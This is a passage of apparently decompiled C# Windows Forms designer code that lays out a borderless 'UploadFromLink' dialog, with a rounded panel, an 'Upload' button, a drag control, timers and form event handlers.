        this.PanelRight.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelRight.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelRight.BackgroundImage");
        this.PanelRight.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelRight.BorderColor = System.Drawing.Color.White;
        this.PanelRight.BorderRadius = 30;
        this.PanelRight.BorderThickness = 1;
        this.PanelRight.Location = new System.Drawing.Point(652, 96);
        this.PanelRight.Name = "PanelRight";
        this.PanelRight.ShowBorders = true;
        this.PanelRight.Size = new System.Drawing.Size(25, 104);
        this.PanelRight.TabIndex = 591;
        this.UploadFile.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.UploadFile.Animated = true;
        this.UploadFile.BackColor = System.Drawing.Color.White;
        this.UploadFile.BorderRadius = 6;
        this.UploadFile.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.UploadFile.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.UploadFile.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.UploadFile.CheckedState.Parent = this.UploadFile;
        this.UploadFile.Cursor = System.Windows.Forms.Cursors.Hand;
        this.UploadFile.CustomImages.Parent = this.UploadFile;
        this.UploadFile.Enabled = false;
        this.UploadFile.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.UploadFile.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.UploadFile.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.UploadFile.ForeColor = System.Drawing.Color.White;
        this.UploadFile.HoverState.Parent = this.UploadFile;
        this.UploadFile.Location = new System.Drawing.Point(542, 215);
        this.UploadFile.Name = "UploadFile";
        this.UploadFile.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.UploadFile.PressedDepth = 50;
        this.UploadFile.ShadowDecoration.Parent = this.UploadFile;
        this.UploadFile.Size = new System.Drawing.Size(97, 25);
        this.UploadFile.TabIndex = 574;
        this.UploadFile.Text = "Upload";
        this.UploadFile.Click += new System.EventHandler(UploadFile_Click);
        this.FormDragControl1.Fixed = true;
        this.FormDragControl1.Horizontal = true;
        this.FormDragControl1.TargetControl = this.PanelTitle;
        this.FormDragControl1.Vertical = true;
        this.Timer1.Enabled = true;
        this.Timer1.Interval = 2000;
        this.Timer1.Tick += new System.EventHandler(Timer1_Tick);
        this.Timer2.Enabled = true;
        this.Timer2.Tick += new System.EventHandler(Timer2_Tick);
        base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
        base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
        this.BackColor = System.Drawing.Color.Gainsboro;
        base.ClientSize = new System.Drawing.Size(686, 281);
        base.Controls.Add(this.panelForm);
        base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
        base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
        base.Name = "UploadFromLink";
        base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
        this.Text = "UploadFromLink";
        base.TransparencyKey = System.Drawing.Color.Gainsboro;
        base.FormClosing += new System.Windows.Forms.FormClosingEventHandler(UploadFromLink_FormClosing);
        base.Load += new System.EventHandler(UploadFromLink_Load);
        base.Shown += new System.EventHandler(UploadFromLink_Shown);
        this.panelForm.ResumeLayout(false);
        this.panelForm.PerformLayout();
        this.PanelTitle.ResumeLayout(false);
        this.PanelTitle.PerformLayout();
        ((System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
        base.ResumeLayout(false);
    }
}
